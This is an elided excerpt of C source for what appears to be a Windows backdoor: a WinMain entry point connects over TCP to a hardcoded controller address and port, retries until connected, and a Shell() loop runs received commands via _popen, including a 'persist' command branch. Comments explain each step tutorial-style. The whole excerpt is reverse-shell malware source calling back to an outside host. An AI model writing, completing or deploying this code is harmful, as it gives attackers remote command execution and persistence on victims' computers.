...
void Shell(){
	...
	while(1){
		...
		else if(strncmp("persist", buffer, 7) == 0)
		{
			...
			FILE *fp;
			fp =  _popen(buffer, "r"); //read this buffer and execute it
...
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){
	...
	char *ServIP;
	WSADATA wsaData;
	ServIP = "192.168.68.5"; //Server Addr
	ServPort = 50005; //Server Port

	if (WSAStartup(MAKEWORD(2,0), &wsaData) != 0){ //first function to be called by a network application. Provides on Windows socket implementation. if !=, returns the error code.

		exit(1);
	}
	sock =socket(AF_INET, SOCK_STREAM, 0 ); //Creates a TCP  IPv4 Socket

	memset(&ServAddr, 0, sizeof(ServAddr)); //sets the address with 0s
	...
	start:
	while (connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0) { //continue running until socket is equal to zero

		Sleep(10);
		goto start; //go back to start checkpoint
	}
